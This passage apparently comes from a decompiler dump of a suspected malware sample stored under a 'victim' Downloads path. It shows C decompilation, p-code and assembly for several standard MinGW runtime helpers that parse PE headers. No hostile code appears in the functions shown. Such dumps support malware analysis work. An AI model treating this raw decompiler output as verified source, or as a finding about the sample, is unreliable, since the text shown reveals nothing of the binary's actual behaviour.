MOVZX ECX,word ptr [RAX + 0x6]
MOV EAX,ECX
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _FindPESectionExec
C Decompilation:

/* WARNING: Unknown calling convention */

PIMAGE_SECTION_HEADER _FindPESectionExec(size_t eNo)

{
  PIMAGE_SECTION_HEADER p_Var1;
  PIMAGE_SECTION_HEADER p_Var2;
  int *piVar3;
  
  if (((*(short *)_refptr___ImageBase == 0x5a4d) &&
      (piVar3 = (int *)(_refptr___ImageBase + *(int *)(_refptr___ImageBase + 0x3c)),
      *piVar3 == 0x4550)) && (*(short *)(piVar3 + 6) == 0x20b)) {
    p_Var2 = (PIMAGE_SECTION_HEADER)((longlong)piVar3 + (ulonglong)*(ushort *)(piVar3 + 5) + 0x18);
    if (*(ushort *)((longlong)piVar3 + 6) != 0) {
      p_Var1 = p_Var2 + (ulonglong)(*(ushort *)((longlong)piVar3 + 6) - 1) + 1;
      do {
        if ((*(byte *)((longlong)&p_Var2->Characteristics + 3) & 0x20) != 0) {
          if (eNo == 0) {
            return p_Var2;
          }
          eNo = eNo - 1;
        }
        p_Var2 = p_Var2 + 1;
      } while (p_Var1 != p_Var2);
    }
    return (PIMAGE_SECTION_HEADER)0x0;
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



Pcode Representation:
(register, 0x0, 8) COPY (const, 0x0, 8)
(unique, 0x10000084, 8) CAST (ram, 0x1400044e0, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x10000084, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x5a4d, 2)
 ---  CBRANCH (ram, 0x1400024d0, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (ram, 0x1400044e0, 8) , (const, 0x3c, 8) , (const, 0x1, 8)
(unique, 0x1000008c, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x1000008c, 8)
(register, 0x10, 8) INT_SEXT (unique, 0xdb00, 4)
(unique, 0x10000094, 8) PTRADD (ram, 0x1400044e0, 8) , (register, 0x10, 8) , (const, 0x1, 8)
(register, 0x10, 8) CAST (unique, 0x10000094, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (register, 0x10, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb80, 4) , (const, 0x4550, 4)
 ---  CBRANCH (ram, 0x1400024d8, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x10, 8) , (const, 0x6, 8) , (const, 0x4, 8)
(unique, 0x1000009c, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x1000009c, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x20b, 2)
 ---  CBRANCH (ram, 0x1400024d0, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x10, 8) , (const, 0x5, 8) , (const, 0x4, 8)
(unique, 0x100000a4, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x100000a4, 8)
(register, 0x0, 8) INT_ZEXT (unique, 0xda80, 2)
(unique, 0x100000ac, 8) CAST (register, 0x10, 8)
(unique, 0x100000b4, 8) INT_ADD (unique, 0x100000ac, 8) , (const, 0x6, 8)
(unique, 0x4400, 8) CAST (unique, 0x100000b4, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x1000004c, 8) INT_ADD (register, 0x0, 8) , (const, 0x18, 8)
(unique, 0x100000bc, 8) CAST (register, 0x10, 8)
(unique, 0x100000c4, 8) INT_ADD (unique, 0x100000bc, 8) , (unique, 0x1000004c, 8)
(unique, 0x4d00, 8) CAST (unique, 0x100000c4, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xda80, 2) , (const, 0x0, 2)
 ---  CBRANCH (ram, 0x140002520, 1) , (register, 0x206, 1)
(unique, 0x10000010, 4) INT_ZEXT (unique, 0xda80, 2)
(register, 0x10, 4) INT_SUB (unique, 0x10000010, 4) , (const, 0x1, 4)
(register, 0x10, 8) INT_ZEXT (register, 0x10, 4)
(unique, 0x1000005c, 8) INT_ADD (register, 0x10, 8) , (const, 0x1, 8)
(unique, 0x4d00, 8) PTRADD (unique, 0x4d00, 8) , (unique, 0x1000005c, 8) , (const, 0x28, 8)
(register, 0x8, 8) MULTIEQUAL (register, 0x8, 8) , (register, 0x8, 8)
(register, 0x0, 8) MULTIEQUAL (unique, 0x4d00, 8) , (register, 0x0, 8)
(unique, 0x1000006c, 8) PTRSUB (register, 0x0, 8) , (const, 0x24, 8)
(unique, 0x100000cc, 8) CAST (unique, 0x1000006c, 8)
(unique, 0x100000d4, 8) INT_ADD (unique, 0x100000cc, 8) , (const, 0x3, 8)
(unique, 0x4400, 8) CAST (unique, 0x100000d4, 8)
(unique, 0xd980, 1) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x58a80, 1) INT_AND (unique, 0xd980, 1) , (const, 0x20, 1)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0x58a80, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x140002517, 1) , (register, 0x206, 1)
(register, 0x206, 1) INT_EQUAL (register, 0x8, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x1400024d0, 1) , (register, 0x206, 1)
(register, 0x0, 8) COPY (register, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)
(register, 0x8, 8) INT_SUB (register, 0x8, 8) , (const, 0x1, 8)
(register, 0x8, 8) MULTIEQUAL (register, 0x8, 8) , (register, 0x8, 8)
(register, 0x0, 8) PTRADD (register, 0x0, 8) , (const, 0x1, 8) , (const, 0x28, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0x4d00, 8) , (register, 0x0, 8)
 ---  CBRANCH (ram, 0x140002508, 1) , (register, 0x206, 1)
(register, 0x0, 8) COPY (const, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
MOV R8,qword ptr [0x1400044e0]
XOR EAX,EAX
CMP word ptr [R8],0x5a4d
JNZ 0x1400024d0
MOVSXD RDX,dword ptr [R8 + 0x3c]
ADD RDX,R8
CMP dword ptr [RDX],0x4550
JZ 0x1400024d8
RET
CMP word ptr [RDX + 0x18],0x20b
JNZ 0x1400024d0
MOVZX EAX,word ptr [RDX + 0x14]
MOVZX R8D,word ptr [RDX + 0x6]
LEA RAX,[RDX + RAX*0x1 + 0x18]
TEST R8W,R8W
JZ 0x140002520
LEA EDX,[R8 + -0x1]
LEA RDX,[RDX + RDX*0x4]
LEA RDX,[RAX + RDX*0x8 + 0x28]
NOP dword ptr [RAX]
TEST byte ptr [RAX + 0x27],0x20
JZ 0x140002517
TEST RCX,RCX
JZ 0x1400024d0
SUB RCX,0x1
ADD RAX,0x28
CMP RDX,RAX
JNZ 0x140002508
XOR EAX,EAX
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _GetPEImageBase
C Decompilation:

/* WARNING: Unknown calling convention */

PBYTE _GetPEImageBase(void)

{
  PBYTE pBVar1;
  
  if ((*(short *)_refptr___ImageBase == 0x5a4d) &&
     (*(int *)(_refptr___ImageBase + *(int *)(_refptr___ImageBase + 0x3c)) == 0x4550)) {
    pBVar1 = (PBYTE)0x0;
    if (*(short *)((longlong)(_refptr___ImageBase + *(int *)(_refptr___ImageBase + 0x3c)) + 0x18) ==
        0x20b) {
      pBVar1 = _refptr___ImageBase;
    }
    return pBVar1;
  }
  return (PBYTE)0x0;
}



Pcode Representation:
(register, 0x10, 8) COPY (const, 0x0, 8)
(unique, 0x1000002a, 8) CAST (ram, 0x1400044e0, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x1000002a, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x5a4d, 2)
 ---  CBRANCH (ram, 0x14000254f, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (ram, 0x1400044e0, 8) , (const, 0x3c, 8) , (const, 0x1, 8)
(unique, 0x10000032, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000032, 8)
(register, 0x8, 8) INT_SEXT (unique, 0xdb00, 4)
(register, 0x8, 8) PTRADD (ram, 0x1400044e0, 8) , (register, 0x8, 8) , (const, 0x1, 8)
(unique, 0x1000003a, 8) CAST (register, 0x8, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (unique, 0x1000003a, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb80, 4) , (const, 0x4550, 4)
 ---  CBRANCH (ram, 0x140002558, 1) , (register, 0x206, 1)
(unique, 0x10000042, 8) CAST (register, 0x8, 8)
(unique, 0x1000004a, 8) INT_ADD (unique, 0x10000042, 8) , (const, 0x18, 8)
(unique, 0x4400, 8) CAST (unique, 0x1000004a, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x20b, 2)
(unique, 0x1000001a, 8) COPY (register, 0x10, 8)
 ---  CBRANCH (ram, 0x140002562, 1) , (register, 0x206, 1)
(unique, 0x10000022, 8) COPY (ram, 0x1400044e0, 8)
(register, 0x10, 8) MULTIEQUAL (unique, 0x1000001a, 8) , (unique, 0x10000022, 8)
(register, 0x0, 8) COPY (register, 0x10, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)
(register, 0x0, 8) COPY (const, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
MOV RAX,qword ptr [0x1400044e0]
XOR EDX,EDX
CMP word ptr [RAX],0x5a4d
JNZ 0x14000254f
MOVSXD RCX,dword ptr [RAX + 0x3c]
ADD RCX,RAX
CMP dword ptr [RCX],0x4550
JZ 0x140002558
MOV RAX,RDX
RET
CMP word ptr [RCX + 0x18],0x20b
CMOVZ RDX,RAX
MOV RAX,RDX
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _IsNonwritableInCurrentImage
C Decompilation:

BOOL __cdecl _IsNonwritableInCurrentImage(PBYTE pTarget)

{
  longlong lVar1;
  longlong lVar2;
  int *piVar3;
  
  if (((*(short *)_refptr___ImageBase == 0x5a4d) &&
      (piVar3 = (int *)(_refptr___ImageBase + *(int *)(_refptr___ImageBase + 0x3c)),
      *piVar3 == 0x4550)) && (*(short *)(piVar3 + 6) == 0x20b)) {
    lVar2 = (longlong)piVar3 + (ulonglong)*(ushort *)(piVar3 + 5) + 0x18;
    if (*(ushort *)((longlong)piVar3 + 6) != 0) {
      lVar1 = lVar2 + 0x28;
      while (((ulonglong)((longlong)pTarget - (longlong)_refptr___ImageBase) <
              (ulonglong)*(uint *)(lVar2 + 0xc) ||
             ((ulonglong)(*(uint *)(lVar2 + 0xc) + *(int *)(lVar2 + 8)) <=
              (ulonglong)((longlong)pTarget - (longlong)_refptr___ImageBase)))) {
        lVar2 = lVar2 + 0x28;
        if (lVar2 == lVar1 + (ulonglong)(*(ushort *)((longlong)piVar3 + 6) - 1) * 0x28) {
          return 0;
        }
      }
      return ~*(uint *)(lVar2 + 0x24) >> 0x1f;
    }
  }
  return 0;
}



Pcode Representation:
(unique, 0x10000055, 8) CAST (ram, 0x1400044e0, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x10000055, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x5a4d, 2)
 ---  CBRANCH (ram, 0x140002590, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (ram, 0x1400044e0, 8) , (const, 0x3c, 8) , (const, 0x1, 8)
(unique, 0x1000005d, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x1000005d, 8)
(register, 0x80, 8) INT_SEXT (unique, 0xdb00, 4)
(unique, 0x10000065, 8) PTRADD (ram, 0x1400044e0, 8) , (register, 0x80, 8) , (const, 0x1, 8)
(register, 0x80, 8) CAST (unique, 0x10000065, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (register, 0x80, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb80, 4) , (const, 0x4550, 4)
 ---  CBRANCH (ram, 0x140002598, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x80, 8) , (const, 0x6, 8) , (const, 0x4, 8)
(unique, 0x1000006d, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x1000006d, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x20b, 2)
 ---  CBRANCH (ram, 0x140002590, 1) , (register, 0x206, 1)
(unique, 0x10000075, 8) CAST (register, 0x8, 8)
(unique, 0x1000007d, 8) CAST (ram, 0x1400044e0, 8)
(register, 0x8, 8) INT_SUB (unique, 0x10000075, 8) , (unique, 0x1000007d, 8)
(unique, 0x10000085, 8) CAST (register, 0x80, 8)
(unique, 0x1000008d, 8) INT_ADD (unique, 0x10000085, 8) , (const, 0x6, 8)
(unique, 0x4400, 8) CAST (unique, 0x1000008d, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x4400, 8) PTRADD (register, 0x80, 8) , (const, 0x5, 8) , (const, 0x4, 8)
(unique, 0x10000095, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x10000095, 8)
(register, 0x10, 8) INT_ZEXT (unique, 0xda80, 2)
(unique, 0x1000004d, 8) INT_ADD (register, 0x10, 8) , (const, 0x18, 8)
(unique, 0x1000009d, 8) CAST (register, 0x80, 8)
(unique, 0x4d00, 8) INT_ADD (unique, 0x1000009d, 8) , (unique, 0x1000004d, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xda80, 2) , (const, 0x0, 2)
 ---  CBRANCH (ram, 0x140002590, 1) , (register, 0x206, 1)
(unique, 0x10000018, 4) INT_ZEXT (unique, 0xda80, 2)
(register, 0x0, 4) INT_SUB (unique, 0x10000018, 4) , (const, 0x1, 4)
(register, 0x0, 8) INT_ZEXT (register, 0x0, 4)
(unique, 0x4b80, 8) INT_ADD (unique, 0x4d00, 8) , (const, 0x28, 8)
(unique, 0x4c00, 8) INT_MULT (register, 0x0, 8) , (const, 0x28, 8)
(unique, 0x4d00, 8) INT_ADD (unique, 0x4b80, 8) , (unique, 0x4c00, 8)
(register, 0x10, 8) MULTIEQUAL (unique, 0x4d00, 8) , (register, 0x10, 8)
(unique, 0x100000a5, 8) INT_ADD (register, 0x10, 8) , (const, 0xc, 8)
(unique, 0x4400, 8) CAST (unique, 0x100000a5, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x80, 8) INT_ZEXT (unique, 0xdb00, 4)
(unique, 0x100000ad, 8) CAST (register, 0x8, 8)
(register, 0x200, 1) INT_LESS (unique, 0x100000ad, 8) , (register, 0x80, 8)
 ---  CBRANCH (ram, 0x1400025e4, 1) , (register, 0x200, 1)
(unique, 0x100000b5, 8) INT_ADD (register, 0x10, 8) , (const, 0x8, 8)
(unique, 0x4400, 8) CAST (unique, 0x100000b5, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x0, 4) INT_ADD (unique, 0xdb00, 4) , (unique, 0xdb00, 4)
(register, 0x0, 8) INT_ZEXT (register, 0x0, 4)
(unique, 0x100000bd, 8) CAST (register, 0x8, 8)
(register, 0x200, 1) INT_LESSEQUAL (register, 0x0, 8) , (unique, 0x100000bd, 8)
 ---  CBRANCH (ram, 0x1400025f0, 1) , (register, 0x200, 1)
(unique, 0x100000c5, 8) INT_ADD (register, 0x10, 8) , (const, 0x24, 8)
(unique, 0x4400, 8) CAST (unique, 0x100000c5, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x0, 4) INT_NEGATE (unique, 0xdb00, 4)
(register, 0x0, 4) INT_RIGHT (register, 0x0, 4) , (const, 0x1f, 4)
(register, 0x0, 4) COPY (register, 0x0, 4)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x10, 8) INT_ADD (register, 0x10, 8) , (const, 0x28, 8)
(register, 0x206, 1) INT_EQUAL (register, 0x10, 8) , (unique, 0x4d00, 8)
 ---  CBRANCH (ram, 0x1400025d0, 1) , (register, 0x206, 1)
(register, 0x0, 4) COPY (const, 0x0, 4)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x0, 4) COPY (const, 0x0, 4)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
MOV RDX,qword ptr [0x1400044e0]
XOR EAX,EAX
CMP word ptr [RDX],0x5a4d
JNZ 0x140002590
MOVSXD R8,dword ptr [RDX + 0x3c]
ADD R8,RDX
CMP dword ptr [R8],0x4550
JZ 0x140002598
RET
CMP word ptr [R8 + 0x18],0x20b
JNZ 0x140002590
SUB RCX,RDX
MOVZX R9D,word ptr [R8 + 0x6]
MOVZX EDX,word ptr [R8 + 0x14]
LEA RDX,[R8 + RDX*0x1 + 0x18]
TEST R9W,R9W
JZ 0x140002590
LEA EAX,[R9 + -0x1]
LEA RAX,[RAX + RAX*0x4]
LEA R9,[RDX + RAX*0x8 + 0x28]
NOP word ptr CS:[RAX + RAX*0x1]
MOV R8D,dword ptr [RDX + 0xc]
MOV RAX,R8
CMP RCX,R8
JC 0x1400025e4
ADD EAX,dword ptr [RDX + 0x8]
CMP RCX,RAX
JC 0x1400025f0
ADD RDX,0x28
CMP RDX,R9
JNZ 0x1400025d0
XOR EAX,EAX
RET
MOV EAX,dword ptr [RDX + 0x24]
NOT EAX
SHR EAX,0x1f
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __mingw_enum_import_library_names
C Decompilation:

/* WARNING: Unknown calling convention */

char * __mingw_enum_import_library_names(int i)

{
  longlong lVar1;
  ulonglong uVar2;
  undefined *puVar3;
  longlong lVar4;
  int *piVar5;
  
  if ((((*(short *)_refptr___ImageBase == 0x5a4d) &&
       (piVar5 = (int *)(_refptr___ImageBase + *(int *)(_refptr___ImageBase + 0x3c)),
       *piVar5 == 0x4550)) && (*(short *)(piVar5 + 6) == 0x20b)) &&
     (uVar2 = (ulonglong)(uint)piVar5[0x24], piVar5[0x24] != 0)) {
    lVar4 = (longlong)piVar5 + (ulonglong)*(ushort *)(piVar5 + 5) + 0x18;
    if (*(ushort *)((longlong)piVar5 + 6) != 0) {
      lVar1 = lVar4 + 0x28;
      while ((uVar2 < *(uint *)(lVar4 + 0xc) ||
             (*(uint *)(lVar4 + 0xc) + *(int *)(lVar4 + 8) <= uVar2))) {
        lVar4 = lVar4 + 0x28;
        if (lVar1 + (ulonglong)(*(ushort *)((longlong)piVar5 + 6) - 1) * 0x28 == lVar4) {
          return (char *)0x0;
        }
      }
      for (puVar3 = _refptr___ImageBase + uVar2;
          (*(int *)(puVar3 + 4) != 0 || (*(int *)(puVar3 + 0xc) != 0)); puVar3 = puVar3 + 0x14) {
        if (i < 1) {
          return _refptr___ImageBase + *(uint *)(puVar3 + 0xc);
        }
        i = i + -1;
      }
      return (char *)0x0;
    }
  }
  return (char *)0x0;
}



Pcode Representation:
(unique, 0x1000005c, 8) CAST (ram, 0x1400044e0, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x1000005c, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x5a4d, 2)
 ---  CBRANCH (ram, 0x140002622, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (ram, 0x1400044e0, 8) , (const, 0x3c, 8) , (const, 0x1, 8)
(unique, 0x10000064, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000064, 8)
(register, 0x80, 8) INT_SEXT (unique, 0xdb00, 4)
(unique, 0x1000006c, 8) PTRADD (ram, 0x1400044e0, 8) , (register, 0x80, 8) , (const, 0x1, 8)
(register, 0x80, 8) CAST (unique, 0x1000006c, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (register, 0x80, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb80, 4) , (const, 0x4550, 4)
 ---  CBRANCH (ram, 0x140002630, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x80, 8) , (const, 0x6, 8) , (const, 0x4, 8)
(unique, 0x10000074, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x10000074, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x20b, 2)
 ---  CBRANCH (ram, 0x140002622, 1) , (register, 0x206, 1)
(unique, 0x4500, 8) PTRADD (register, 0x80, 8) , (const, 0x24, 8) , (const, 0x4, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4500, 8)
(unique, 0x1000007c, 4) CAST (unique, 0xdb00, 4)
(register, 0x0, 8) INT_ZEXT (unique, 0x1000007c, 4)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140002622, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x80, 8) , (const, 0x5, 8) , (const, 0x4, 8)
(unique, 0x10000080, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x10000080, 8)
(register, 0x10, 8) INT_ZEXT (unique, 0xda80, 2)
(unique, 0x10000088, 8) CAST (register, 0x80, 8)
(unique, 0x10000090, 8) INT_ADD (unique, 0x10000088, 8) , (const, 0x6, 8)
(unique, 0x4400, 8) CAST (unique, 0x10000090, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x10000054, 8) INT_ADD (register, 0x10, 8) , (const, 0x18, 8)
(unique, 0x10000098, 8) CAST (register, 0x80, 8)
(unique, 0x4d00, 8) INT_ADD (unique, 0x10000098, 8) , (unique, 0x10000054, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xda80, 2) , (const, 0x0, 2)
 ---  CBRANCH (ram, 0x140002622, 1) , (register, 0x206, 1)
(unique, 0x10000010, 4) INT_ZEXT (unique, 0xda80, 2)
(register, 0x80, 4) INT_SUB (unique, 0x10000010, 4) , (const, 0x1, 4)
(register, 0x80, 8) INT_ZEXT (register, 0x80, 4)
(unique, 0x4b80, 8) INT_ADD (unique, 0x4d00, 8) , (const, 0x28, 8)
(unique, 0x4c00, 8) INT_MULT (register, 0x80, 8) , (const, 0x28, 8)
(unique, 0x4d00, 8) INT_ADD (unique, 0x4b80, 8) , (unique, 0x4c00, 8)
(register, 0x10, 8) MULTIEQUAL (unique, 0x4d00, 8) , (register, 0x10, 8)
(unique, 0x100000a0, 8) INT_ADD (register, 0x10, 8) , (const, 0xc, 8)
(unique, 0x4400, 8) CAST (unique, 0x100000a0, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x88, 8) INT_ZEXT (unique, 0xdb00, 4)
(register, 0x200, 1) INT_LESS (register, 0x0, 8) , (register, 0x88, 8)
 ---  CBRANCH (ram, 0x140002685, 1) , (register, 0x200, 1)
(unique, 0x100000a8, 8) INT_ADD (register, 0x10, 8) , (const, 0x8, 8)
(unique, 0x4400, 8) CAST (unique, 0x100000a8, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x80, 4) INT_ADD (unique, 0xdb00, 4) , (unique, 0xdb00, 4)
(register, 0x80, 8) INT_ZEXT (register, 0x80, 4)
(register, 0x200, 1) INT_LESSEQUAL (register, 0x80, 8) , (register, 0x0, 8)
 ---  CBRANCH (ram, 0x140002698, 1) , (register, 0x200, 1)
(register, 0x10, 8) INT_ADD (register, 0x10, 8) , (const, 0x28, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0x4d00, 8) , (register, 0x10, 8)
 ---  CBRANCH (ram, 0x140002670, 1) , (register, 0x206, 1)
(register, 0x0, 8) COPY (const, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)
(register, 0x0, 8) PTRADD (ram, 0x1400044e0, 8) , (register, 0x0, 8) , (const, 0x1, 8)
 ---  BRANCH (ram, 0x1400026a7, 1)
(register, 0x8, 4) MULTIEQUAL (register, 0x8, 4) , (register, 0x8, 4)
(register, 0x0, 8) MULTIEQUAL (register, 0x0, 8) , (register, 0x0, 8)
(unique, 0x4400, 8) PTRADD (register, 0x0, 8) , (const, 0x4, 8) , (const, 0x1, 8)
(unique, 0x100000b0, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x100000b0, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400026b7, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x0, 8) , (const, 0xc, 8) , (const, 0x1, 8)
(unique, 0x100000b8, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x100000b8, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x14000268e, 1) , (register, 0x206, 1)
(unique, 0xef00, 1) INT_SLESS (register, 0x8, 4) , (const, 0x1, 4)
 ---  CBRANCH (ram, 0x1400026a0, 1) , (unique, 0xef00, 1)
(unique, 0x4400, 8) PTRADD (register, 0x0, 8) , (const, 0xc, 8) , (const, 0x1, 8)
(unique, 0x100000c0, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x100000c0, 8)
(register, 0x88, 8) INT_ZEXT (unique, 0xdb00, 4)
(register, 0x88, 8) PTRADD (ram, 0x1400044e0, 8) , (register, 0x88, 8) , (const, 0x1, 8)
(register, 0x0, 8) COPY (register, 0x88, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)
(register, 0x8, 4) INT_ADD (register, 0x8, 4) , (const, 0xffffffff, 4)
(register, 0x0, 8) PTRADD (register, 0x0, 8) , (const, 0x14, 8) , (const, 0x1, 8)
(register, 0x0, 8) COPY (const, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)
(register, 0x0, 8) COPY (const, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
MOV R11,qword ptr [0x1400044e0]
XOR R9D,R9D
CMP word ptr [R11],0x5a4d
JNZ 0x140002622
MOVSXD R8,dword ptr [R11 + 0x3c]
ADD R8,R11
CMP dword ptr [R8],0x4550
JZ 0x140002630
MOV RAX,R9
RET
CMP word ptr [R8 + 0x18],0x20b
JNZ 0x140002622
MOV EAX,dword ptr [R8 + 0x90]
TEST EAX,EAX
JZ 0x140002622
MOVZX EDX,word ptr [R8 + 0x14]
MOVZX R10D,word ptr [R8 + 0x6]
LEA RDX,[R8 + RDX*0x1 + 0x18]
TEST R10W,R10W
JZ 0x140002622
LEA R8D,[R10 + -0x1]
LEA R8,[R8 + R8*0x4]
LEA R10,[RDX + R8*0x8 + 0x28]
NOP word ptr CS:[RAX + RAX*0x1]
MOV R9D,dword ptr [RDX + 0xc]
MOV R8,R9
CMP RAX,R9
JC 0x140002685
ADD R8D,dword ptr [RDX + 0x8]
CMP RAX,R8
JC 0x140002698
ADD RDX,0x28
CMP R10,RDX
JNZ 0x140002670
XOR R9D,R9D
MOV RAX,R9
RET
ADD RAX,R11
JMP 0x1400026a7
SUB ECX,0x1
ADD RAX,0x14
MOV R8D,dword ptr [RAX + 0x4]
TEST R8D,R8D
JNZ 0x1400026b7
MOV EDX,dword ptr [RAX + 0xc]
TEST EDX,EDX
JZ 0x14000268e
TEST ECX,ECX
JG 0x1400026a0
MOV R9D,dword ptr [RAX + 0xc]
ADD R9,R11
MOV RAX,R9
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: ___chkstk_ms
C Decompilation:

/* WARNING: This is an inlined function */

ulonglong ___chkstk_ms(void)

{
